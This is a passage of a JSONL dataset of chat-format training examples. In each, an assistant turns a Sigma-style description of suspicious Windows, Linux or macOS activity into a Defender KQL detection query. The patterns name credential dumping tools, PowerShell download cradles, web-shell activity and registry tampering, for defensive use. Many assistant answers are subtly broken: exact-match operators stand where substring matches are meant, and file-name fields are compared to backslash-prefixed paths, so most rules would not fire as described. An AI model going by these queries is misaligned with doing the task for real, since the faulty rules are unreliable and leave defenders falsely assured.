\"\ud83d\uddd1\", \"\ud83e\udeaa\", \"\ud83d\udcc7\", \"\ud83d\uddc3\", \"\ud83d\uddf3\", \"\ud83d\uddc4\", \"\ud83d\udccb\", \"\ud83d\udcc1\", \"\ud83d\udcc2\", \"\ud83d\uddc2\", \"\ud83d\uddde\", \"\ud83d\udcf0\", \"\ud83d\udcd3\", \"\ud83d\udcd4\", \"\ud83d\udcd2\", \"\ud83d\udcd5\", \"\ud83d\udcd7\", \"\ud83d\udcd8\", \"\ud83d\udcd9\", \"\ud83d\udcda\", \"\ud83d\udcd6\", \"\ud83d\udd16\", \"\ud83e\uddf7\", \"\ud83d\udd17\", \"\ud83d\udcce\", \"\ud83d\udd87\", \"\ud83d\udcd0\", \"\ud83d\udccf\", \"\ud83e\uddee\", \"\ud83d\udccc\", \"\ud83d\udccd\", \"\u2702\ufe0f\", \"\ud83d\udd8a\", \"\ud83d\udd8b\", \"\u2712\ufe0f\", \"\ud83d\udd8c\", \"\ud83d\udd8d\", \"\ud83d\udcdd\", \"\u270f\ufe0f\", \"\ud83d\udd0d\", \"\ud83d\udd0e\", \"\ud83d\udd0f\", \"\ud83d\udd10\", \"\ud83d\udd12\", \"\ud83d\udd13\u2764\ufe0f\", \"\ud83e\udde1\", \"\ud83d\udc9b\", \"\ud83d\udc9a\", \"\ud83d\udc99\", \"\ud83d\udc9c\", \"\ud83d\udda4\", \"\ud83e\udd0d\", \"\ud83e\udd0e\", \"\u2764\ufe0f\u200d\ud83d\udd25\", \"\u2764\ufe0f\u200d\ud83e\ude79\", \"\ud83d\udc94\", \"\u2763\ufe0f\", \"\ud83d\udc95\", \"\ud83d\udc9e\", \"\ud83d\udc93\", \"\ud83d\udc97\", \"\ud83d\udc96\", \"\ud83d\udc98\", \"\ud83d\udc9d\", \"\ud83d\udc9f\", \"\u262e\ufe0f\", \"\u271d\ufe0f\", \"\u262a\ufe0f\", \"\ud83d\udd49\", \"\u2638\ufe0f\", \"\u2721\ufe0f\", \"\ud83d\udd2f\", \"\ud83d\udd4e\", \"\u262f\ufe0f\", \"\u2626\ufe0f\", \"\ud83d\uded0\", \"\u26ce\", \"\u2648\ufe0f\", \"\u2649\ufe0f\", \"\u264a\ufe0f\", \"\u264b\ufe0f\", \"\u264c\ufe0f\", \"\u264d\ufe0f\", \"\u264e\ufe0f\", \"\u264f\ufe0f\", \"\u2650\ufe0f\", \"\u2651\ufe0f\", \"\u2652\ufe0f\", \"\u2653\ufe0f\", \"\ud83c\udd94\", \"\u269b\ufe0f\", \"\ud83c\ude51\", \"\u2622\ufe0f\", \"\u2623\ufe0f\", \"\ud83d\udcf4\", \"\ud83d\udcf3\", \"\ud83c\ude36\", \"\ud83c\ude1a\ufe0f\", \"\ud83c\ude38\", \"\ud83c\ude3a\", \"\ud83c\ude37\ufe0f\", \"\u2734\ufe0f\", \"\ud83c\udd9a\", \"\ud83d\udcae\", \"\ud83c\ude50\", \"\u3299\ufe0f\", \"\u3297\ufe0f\", \"\ud83c\ude34\", \"\ud83c\ude35\", \"\ud83c\ude39\", \"\ud83c\ude32\", \"\ud83c\udd70\ufe0f\", \"\ud83c\udd71\ufe0f\", \"\ud83c\udd8e\", \"\ud83c\udd91\", \"\ud83c\udd7e\ufe0f\", \"\ud83c\udd98\", \"\u274c\", \"\u2b55\ufe0f\", \"\ud83d\uded1\", \"\u26d4\ufe0f\", \"\ud83d\udcdb\", \"\ud83d\udeab\", \"\ud83d\udcaf\", \"\ud83d\udca2\", \"\u2668\ufe0f\", \"\ud83d\udeb7\", \"\ud83d\udeaf\", \"\ud83d\udeb3\", \"\ud83d\udeb1\", \"\ud83d\udd1e\", \"\ud83d\udcf5\", \"\ud83d\udead\", \"\u2757\ufe0f\", \"\u2755\", \"\u2753\", \"\u2754\", \"\u203c\ufe0f\", \"\u2049\ufe0f\", \"\ud83d\udd05\", \"\ud83d\udd06\", \"\u303d\ufe0f\", \"\u26a0\ufe0f\", \"\ud83d\udeb8\", \"\ud83d\udd31\", \"\u269c\ufe0f\", \"\ud83d\udd30\", \"\u267b\ufe0f\", \"\u2705\", \"\ud83c\ude2f\ufe0f\", \"\ud83d\udcb9\", \"\u2747\ufe0f\", \"\u2733\ufe0f\", \"\u274e\", \"\ud83c\udf10\", \"\ud83d\udca0\", \"\u24c2\ufe0f\", \"\ud83c\udf00\", \"\ud83d\udca4\", \"\ud83c\udfe7\", \"\ud83d\udebe\", \"\u267f\ufe0f\", \"\ud83c\udd7f\ufe0f\", \"\ud83d\uded7\", \"\ud83c\ude33\", \"\ud83c\ude02\ufe0f\", \"\ud83d\udec2\", \"\ud83d\udec3\", \"\ud83d\udec4\", \"\ud83d\udec5\", \"\ud83d\udeb9\", \"\ud83d\udeba\", \"\ud83d\udebc\", \"\u26a7\", \"\ud83d\udebb\", \"\ud83d\udeae\", \"\ud83c\udfa6\", \"\ud83d\udcf6\", \"\ud83c\ude01\", \"\ud83d\udd23\", \"\u2139\ufe0f\", \"\ud83d\udd24\", \"\ud83d\udd21\", \"\ud83d\udd20\", \"\ud83c\udd96\", \"\ud83c\udd97\", \"\ud83c\udd99\", \"\ud83c\udd92\", \"\ud83c\udd95\", \"\ud83c\udd93\", \"0\ufe0f\u20e3\", \"1\ufe0f\u20e3\", \"2\ufe0f\u20e3\", \"3\ufe0f\u20e3\", \"4\ufe0f\u20e3\", \"5\ufe0f\u20e3\", \"6\ufe0f\u20e3\", \"7\ufe0f\u20e3\", \"8\ufe0f\u20e3\", \"9\ufe0f\u20e3\", \"\ud83d\udd1f\", \"\ud83d\udd22\", \"#\ufe0f\u20e3\", \"\u23cf\ufe0f\", \"\u25b6\ufe0f\", \"\u23f8\", \"\u23ef\", \"\u23f9\", \"\u23fa\", \"\u23ed\", \"\u23ee\", \"\u23e9\", \"\u23ea\", \"\u23eb\", \"\u23ec\", \"\u25c0\ufe0f\", \"\ud83d\udd3c\", \"\ud83d\udd3d\", \"\u27a1\ufe0f\", \"\u2b05\ufe0f\", \"\u2b06\ufe0f\", \"\u2b07\ufe0f\", \"\u2197\ufe0f\", \"\u2198\ufe0f\", \"\u2199\ufe0f\", \"\u2196\ufe0f\", \"\u2195\ufe0f\", \"\u2194\ufe0f\", \"\u21aa\ufe0f\", \"\u21a9\ufe0f\", \"\u2934\ufe0f\", \"\u2935\ufe0f\", \"\ud83d\udd00\", \"\ud83d\udd01\", \"\ud83d\udd02\", \"\ud83d\udd04\", \"\ud83d\udd03\", \"\ud83c\udfb5\", \"\ud83c\udfb6\", \"\u2795\", \"\u2796\", \"\u2797\", \"\u2716\ufe0f\", \"\ud83d\udff0\", \"\u267e\", \"\ud83d\udcb2\", \"\ud83d\udcb1\", \"\u2122\ufe0f\", \"\u00a9\ufe0f\", \"\u00ae\ufe0f\", \"\u3030\ufe0f\", \"\u27b0\", \"\u27bf\", \"\ud83d\udd1a\", \"\ud83d\udd19\", \"\ud83d\udd1b\", \"\ud83d\udd1d\", \"\ud83d\udd1c\", \"\u2714\ufe0f\", \"\u2611\ufe0f\", \"\ud83d\udd18\", \"\ud83d\udd34\", \"\ud83d\udfe0\", \"\ud83d\udfe1\", \"\ud83d\udfe2\", \"\ud83d\udd35\", \"\ud83d\udfe3\", \"\u26ab\ufe0f\", \"\u26aa\ufe0f\", \"\ud83d\udfe4\", \"\ud83d\udd3a\", \"\ud83d\udd3b\") or ProcessCommandLine endswith \"\ufe0f\u20e3\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system\n Topic: proc_creation_win_webshell_hacking"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"-tomcat-\", \"\\\\tomcat\")) or ((InitiatingProcessFileName in~ (\"\\\\java.exe\", \"\\\\javaw.exe\")) and (ProcessCommandLine in~ (\"catalina.jar\", \"CATALINA_HOME\"))) or (InitiatingProcessFileName in~ (\"\\\\caddy.exe\", \"\\\\httpd.exe\", \"\\\\nginx.exe\", \"\\\\php-cgi.exe\", \"\\\\w3wp.exe\", \"\\\\ws_tomcatservice.exe\"))) and ((ProcessCommandLine in~ (\"rundll32\", \"comsvcs\")) or (ProcessCommandLine in~ (\" -hp\", \" a \", \" -m\")) or (ProcessCommandLine in~ (\"net\", \" user \", \" /add\")) or (ProcessCommandLine in~ (\"net\", \" localgroup \", \" administrators \", \"/add\")) or (InitiatingProcessFolderPath in~ (\"\\\\ntdsutil.exe\", \"\\\\ldifde.exe\", \"\\\\adfind.exe\", \"\\\\procdump.exe\", \"\\\\Nanodump.exe\", \"\\\\vssadmin.exe\", \"\\\\fsutil.exe\")) or (ProcessCommandLine in~ (\" -decode \", \" -NoP \", \" -W Hidden \", \" /decode \", \" /ticket:\", \" sekurlsa\", \".dmp full\", \".downloadfile(\", \".downloadstring(\", \"FromBase64String\", \"process call create\", \"reg save \", \"whoami /priv\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a Powershell process that contains download commands in its command line string Topic: proc_creation_win_powershell_download_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"string(\", \"file(\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry changes to Office trust records where the path is located in a potentially suspicious location Topic: registry_set_office_trust_record_susp_location"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Security\\\\Trusted Documents\\\\TrustRecords\" and (RegistryKey contains \"/AppData/Local/Microsoft/Windows/INetCache/\" or RegistryKey contains \"/AppData/Local/Temp/\" or RegistryKey contains \"/PerfLogs/\" or RegistryKey contains \"C:/Users/Public/\" or RegistryKey contains \"file:///D:/\" or RegistryKey contains \"file:///E:/\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file with a suspicious extension Topic: proc_creation_win_bitsadmin_download_susp_extensions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".7z\", \".asax\", \".ashx\", \".asmx\", \".asp\", \".aspx\", \".bat\", \".cfm\", \".cgi\", \".chm\", \".cmd\", \".dll\", \".gif\", \".jpeg\", \".jpg\", \".jsp\", \".jspx\", \".log\", \".png\", \".ps1\", \".psm1\", \".rar\", \".scf\", \".sct\", \".txt\", \".vbe\", \".vbs\", \".war\", \".wsf\", \".wsh\", \".xll\", \".zip\")) and (ProcessCommandLine in~ (\" /transfer \", \" /create \", \" /addfile \")) and (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_wow6432node_currentversion"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" and (RegistryKey contains \"\\\\Windows\\\\Appinit_Dlls\" or RegistryKey contains \"\\\\Image File Execution Options\" or RegistryKey contains \"\\\\Drivers32\") and (not((RegistryValueData in~ (\"(Empty)\", \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of local users via the net.exe command with the option \"never expire\" Topic: proc_creation_win_net_user_add_never_expire"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"user\", \"add\", \"expires:never\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the SysInternals Procdump utility Topic: proc_creation_win_sysinternals_procdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"\\\\procdump.exe\", \"\\\\procdump64.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"Wlrmdr.exe\" with the \"-u\" command line flag which allows anything passed to it to be an argument of the ShellExecute API, which would allow an attacker to execute arbitrary binaries.\nThis detection also focuses on any uncommon child processes spawned from \"Wlrmdr.exe\" as a supplement for those that posses \"ParentImage\" telemetry.\n Topic: proc_creation_win_wlrmdr_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\wlrmdr.exe\" or ((((ProcessCommandLine contains \"-s \" or ProcessCommandLine contains \"/s \" or ProcessCommandLine contains \"\u2013s \" or ProcessCommandLine contains \"\u2014s \" or ProcessCommandLine contains \"\u2015s \") and (ProcessCommandLine contains \"-f \" or ProcessCommandLine contains \"/f \" or ProcessCommandLine contains \"\u2013f \" or ProcessCommandLine contains \"\u2014f \" or ProcessCommandLine contains \"\u2015f \") and (ProcessCommandLine contains \"-t \" or ProcessCommandLine contains \"/t \" or ProcessCommandLine contains \"\u2013t \" or ProcessCommandLine contains \"\u2014t \" or ProcessCommandLine contains \"\u2015t \") and (ProcessCommandLine contains \"-m \" or ProcessCommandLine contains \"/m \" or ProcessCommandLine contains \"\u2013m \" or ProcessCommandLine contains \"\u2014m \" or ProcessCommandLine contains \"\u2015m \") and (ProcessCommandLine contains \"-a \" or ProcessCommandLine contains \"/a \" or ProcessCommandLine contains \"\u2013a \" or ProcessCommandLine contains \"\u2014a \" or ProcessCommandLine contains \"\u2015a \") and (ProcessCommandLine contains \"-u \" or ProcessCommandLine contains \"/u \" or ProcessCommandLine contains \"\u2013u \" or ProcessCommandLine contains \"\u2014u \" or ProcessCommandLine contains \"\u2015u \")) and (FolderPath endswith \"\\\\wlrmdr.exe\" or ProcessVersionInfoOriginalFileName =~ \"WLRMNDR.EXE\")) and (not(((InitiatingProcessFileName in~ (\"\", \"-\")) or isnull(InitiatingProcessFileName) or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\winlogon.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"mount\" command with \"hidepid\" parameter to make invisible processes to other users from the system Topic: proc_creation_lnx_mount_hidepid"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"hidepid=2\", \" -o \")) and InitiatingProcessFolderPath =~ \"/mount\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a program executing from a web server root folder. Use this rule to hunt for potential interesting activity such as webshell or backdoors\n Topic: proc_creation_win_susp_execution_path_webserver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\wwwroot\\\\\" or FolderPath contains \"\\\\wmpub\\\\\" or FolderPath contains \"\\\\htdocs\\\\\") and (not(((FolderPath contains \"bin\\\\\" or FolderPath contains \"\\\\Tools\\\\\" or FolderPath contains \"\\\\SMSComponent\\\\\") and InitiatingProcessFileName =~ \"\\\\services.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of renamed Remote Utilities (RURAT) via Product PE header field Topic: proc_creation_win_renamed_rurat"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoProductName =~ \"Remote Utilities\" and (not((InitiatingProcessFolderPath in~ (\"\\\\rutserv.exe\", \"\\\\rfusclient.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering of RDP Terminal Service/Server sensitive settings.\nSuch as allowing unauthorized users access to a system via the fAllowUnsolicited or enabling RDP via fDenyTSConnections...etc\n Topic: registry_set_terminal_server_tampering"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\Control\\\\Terminal Server*\" or RegistryKey endswith \"\\\\Windows NT\\\\Terminal Services*\") and RegistryKey endswith \"\\\\Shadow\" and (RegistryValueData in~ (\"DWORD (0x00000001)\", \"DWORD (0x00000002)\", \"DWORD (0x00000003)\", \"DWORD (0x00000004)\"))) or ((RegistryKey endswith \"\\\\Control\\\\Terminal Server*\" or RegistryKey endswith \"\\\\Windows NT\\\\Terminal Services*\") and (RegistryKey endswith \"\\\\DisableRemoteDesktopAntiAlias\" or RegistryKey endswith \"\\\\DisableSecuritySettings\" or RegistryKey endswith \"\\\\fAllowUnsolicited\" or RegistryKey endswith \"\\\\fAllowUnsolicitedFullControl\") and RegistryValueData =~ \"DWORD (0x00000001)\") or (RegistryKey contains \"\\\\Control\\\\Terminal Server\\\\InitialProgram\" or RegistryKey contains \"\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\InitialProgram\" or RegistryKey contains \"\\\\services\\\\TermService\\\\Parameters\\\\ServiceDll\" or RegistryKey contains \"\\\\Windows NT\\\\Terminal Services\\\\InitialProgram\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious run-only executions compiled using OSACompile Topic: proc_creation_macos_osacompile_runonly_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"osacompile\", \" -x \", \" -e \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file named \"WerFault.exe\" in the WinSxS directory by a non-system process, which can be indicative of potential SNAKE malware activity Topic: file_event_win_malware_snake_werfault_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\WerFault.exe\" and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image detection Topic: proc_creation_win_susp_ntfs_short_name_path_use_image"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"~1\\\\\" or FolderPath contains \"~2\\\\\") and (not((((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\Dism.exe\", \"C:\\\\Windows\\\\System32\\\\cleanmgr.exe\")) or (InitiatingProcessFolderPath endswith \"\\\\WebEx\\\\WebexHost.exe\" or InitiatingProcessFolderPath endswith \"\\\\thor\\\\thor64.exe\") or ProcessVersionInfoProductName =~ \"InstallShield (R)\" or ProcessVersionInfoFileDescription =~ \"InstallShield (R) Setup Engine\" or ProcessVersionInfoCompanyName =~ \"InstallShield Software Corporation\") or ((FolderPath contains \"\\\\AppData\\\\\" and FolderPath contains \"\\\\Temp\\\\\") or (FolderPath endswith \"~1\\\\unzip.exe\" or FolderPath endswith \"~1\\\\7zG.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"Add-AppxPackage\" or its alias \"Add-AppPackage\" to install unsigned AppX packages Topic: proc_creation_win_powershell_install_unsigned_appx_packages"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Add-AppPackage \", \"Add-AppxPackage \")) and ProcessCommandLine =~ \" -AllowUnsigned\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed office binary Topic: proc_creation_win_renamed_office_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName in~ (\"Excel.exe\", \"MSACCESS.EXE\", \"MSPUB.EXE\", \"OneNote.exe\", \"OneNoteM.exe\", \"OUTLOOK.EXE\", \"POWERPNT.EXE\", \"WinWord.exe\")) or (ProcessVersionInfoFileDescription in~ (\"Microsoft Access\", \"Microsoft Excel\", \"Microsoft OneNote\", \"Microsoft Outlook\", \"Microsoft PowerPoint\", \"Microsoft Publisher\", \"Microsoft Word\", \"Sent to OneNote Tool\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\EXCEL.exe\", \"\\\\excelcnv.exe\", \"\\\\MSACCESS.exe\", \"\\\\MSPUB.EXE\", \"\\\\ONENOTE.EXE\", \"\\\\ONENOTEM.EXE\", \"\\\\OUTLOOK.EXE\", \"\\\\POWERPNT.EXE\", \"\\\\WINWORD.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of KeyScrambler.exe Topic: proc_creation_win_keyscrambler_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"cscript.exe\", \"mshta.exe\", \"PowerShell.EXE\", \"pwsh.dll\", \"regsvr32.exe\", \"RUNDLL32.EXE\", \"wscript.exe\"))) and InitiatingProcessFileName =~ \"\\\\KeyScrambler.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n Topic: proc_creation_win_squirrel_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" --download \", \" --update \", \" --updateRollback=\")) and ProcessCommandLine =~ \"http\" and (InitiatingProcessFolderPath in~ (\"\\\\squirrel.exe\", \"\\\\update.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns Topic: proc_creation_win_susp_double_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".doc.exe\", \".docx.exe\", \".xls.exe\", \".xlsx.exe\", \".ppt.exe\", \".pptx.exe\", \".rtf.exe\", \".pdf.exe\", \".txt.exe\", \"      .exe\", \"______.exe\", \".doc.js\", \".docx.js\", \".xls.js\", \".xlsx.js\", \".ppt.js\", \".pptx.js\", \".rtf.js\", \".pdf.js\", \".txt.js\")) and (InitiatingProcessFolderPath in~ (\".doc.exe\", \".docx.exe\", \".xls.exe\", \".xlsx.exe\", \".ppt.exe\", \".pptx.exe\", \".rtf.exe\", \".pdf.exe\", \".txt.exe\", \"      .exe\", \"______.exe\", \".doc.js\", \".docx.js\", \".xls.js\", \".xlsx.js\", \".ppt.js\", \".pptx.js\", \".rtf.js\", \".pdf.js\", \".txt.js\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"reg.exe\" to alter registry keys that would replace the users desktop background.\nThis is a common technique used by malware to change the desktop background to a ransom note or other image.\n Topic: proc_creation_win_reg_desktop_background_change"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"add\" and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")) and (ProcessCommandLine in~ (\"Control Panel\\\\Desktop\", \"CurrentVersion\\\\Policies\\\\ActiveDesktop\", \"CurrentVersion\\\\Policies\\\\System\")) and ((ProcessCommandLine in~ (\"/v NoChangingWallpaper\", \"/d 1\")) or (ProcessCommandLine in~ (\"/v Wallpaper\", \"/t REG_SZ\")) or (ProcessCommandLine in~ (\"/v WallpaperStyle\", \"/d 2\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"Setup16.EXE\" and old installation utility with a custom \".lst\" file.\nThese \".lst\" file can contain references to external program that \"Setup16.EXE\" will execute.\nAttackers and adversaries might leverage this as a living of the land utility.\n Topic: proc_creation_win_setup16_custom_lst_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine =~ \" -m \" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\SysWOW64\\\\setup16.exe\") and (not(InitiatingProcessFolderPath =~ \"C:\\\\~MSSETUP.T\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell execution to set the ACL of a file or a folder Topic: proc_creation_win_powershell_set_acl"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Set-Acl \", \"-AclObject \", \"-Path \")) and ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or (FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"taskkill.exe\" in order to stop a service or a process. Look for suspicious parents executing this command in order to hunt for potential malicious activity.\nAttackers might leverage this in order to conduct data destruction or data encrypted for impact on the data stores of services like Exchange and SQL Server.\n Topic: proc_creation_win_taskkill_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -im \" or ProcessCommandLine contains \" /im \" or ProcessCommandLine contains \" \u2013im \" or ProcessCommandLine contains \" \u2014im \" or ProcessCommandLine contains \" \u2015im \" or ProcessCommandLine contains \" -pid \" or ProcessCommandLine contains \" /pid \" or ProcessCommandLine contains \" \u2013pid \" or ProcessCommandLine contains \" \u2014pid \" or ProcessCommandLine contains \" \u2015pid \") and (ProcessCommandLine contains \" -f \" or ProcessCommandLine contains \" /f \" or ProcessCommandLine contains \" \u2013f \" or ProcessCommandLine contains \" \u2014f \" or ProcessCommandLine contains \" \u2015f \" or ProcessCommandLine endswith \" -f\" or ProcessCommandLine endswith \" /f\" or ProcessCommandLine endswith \" \u2013f\" or ProcessCommandLine endswith \" \u2014f\" or ProcessCommandLine endswith \" \u2015f\") and (FolderPath endswith \"\\\\taskkill.exe\" or ProcessVersionInfoOriginalFileName =~ \"taskkill.exe\")) and (not(InitiatingProcessFileName =~ \".tmp\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential PowerShell commands or code within registry run keys Topic: registry_set_powershell_in_run_keys"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" and (RegistryValueData contains \"powershell\" or RegistryValueData contains \"pwsh \" or RegistryValueData contains \"FromBase64String\" or RegistryValueData contains \".DownloadFile(\" or RegistryValueData contains \".DownloadString(\" or RegistryValueData contains \" -w hidden \" or RegistryValueData contains \" -w 1 \" or RegistryValueData contains \"-windowstyle hidden\" or RegistryValueData contains \"-window hidden\" or RegistryValueData contains \" -nop \" or RegistryValueData contains \" -encodedcommand \" or RegistryValueData contains \"-ExecutionPolicy Bypass\" or RegistryValueData contains \"Invoke-Expression\" or RegistryValueData contains \"IEX (\" or RegistryValueData contains \"Invoke-Command\" or RegistryValueData contains \"ICM -\" or RegistryValueData contains \"Invoke-WebRequest\" or RegistryValueData contains \"IWR \" or RegistryValueData contains \" -noni \" or RegistryValueData contains \" -noninteractive \")"}]}
